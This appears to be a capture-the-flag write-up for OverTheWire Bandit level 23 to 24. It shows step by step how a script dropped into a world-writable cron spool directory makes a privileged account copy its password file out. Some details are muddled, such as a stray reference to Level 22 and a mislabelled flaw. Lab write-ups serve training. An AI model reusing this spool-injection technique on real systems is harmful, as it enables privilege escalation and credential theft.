# OverTheWire: Bandit (Levels 23 - 24)
**Platform:** OverTheWire | **OS:** Linux | **Topic:** Cron Jobs & Automation Exploitation | **Date:** October 2026

## 1. Executive Summary
Levels 23 through 24 of the Bandit wargame focus on exploiting insecure automated system tasks (cron jobs). The exploitation paths demonstrated how predictable dynamic file generation and overly permissive spool directories allow low-privileged users to hijack automated processes and force higher-privileged service accounts to expose sensitive data.

## 3. Level 23 #\rightarrow$ 24: Spool Directory Exploitation
**Objective:** Escalate privileges by injecting a malicious payload into an unrestricted cron job execution directory.

**3.1 Reconnaissance**
The cron job configuration and corresponding script for `bandit24` were analyzed.

```bash
cat /etc/cron.d/cronjob_bandit24
output: /usr/bin/cronjob_bandit24.sh
cat /usr/bin/cronjob_bandit24.sh
```
**Script Logic:** The cron job runs every 60 seconds as `bandit24`. It navigates to `/var/spool/bandit24/foo`, blindly executes every file located in that directory, and subsequently deletes them.

**3.2 Payload Development**
A custom Bash payload was engineered to read the `bandit24` password file and output the contents to an attacker-controlled temporary directory.

```bash
mkdir /tmp/ops_workspace
cd /tmp/ops_workspace
```
## Payload Construction (Single quotes utilized to prevent bash history interpolation)
```bash
echo '#!/bin/bash' > exploit.sh
echo 'cat /etc/bandit_pass/bandit24 > /tmp/ops_workspace/password24.txt' >> exploit.sh
```
**3.3 Deployment and Execution**
The payload was granted execution permissions, and the workspace was made universally writable to ensure the bandit24 process could write the output file.

```bash
chmod +x exploit.sh
chmod 777 /tmp/ops_workspace
```
The armed payload was dropped into the target spool directory.

```bash
cp exploit.sh /var/spool/bandit24/foo/
```
After the 60-second cron cycle completed, the exfiltrated password file was successfully generated and read from the workspace.

```bash
cat password24.txt
output: password
```
**3.4 Vulnerability Analysis**
**Predictable Cryptographic Output (CWE-330):** In Level 22, generating sensitive filenames using hardcoded, public inputs allows attackers to easily predict data locations.

**Improper Authorization in Spool Directories (CWE-285):** In Level 23, allowing an automated, high-privileged process to blindly execute unvalidated scripts dropped into a world-writable directory is a textbook Remote Code Execution (RCE) vector.

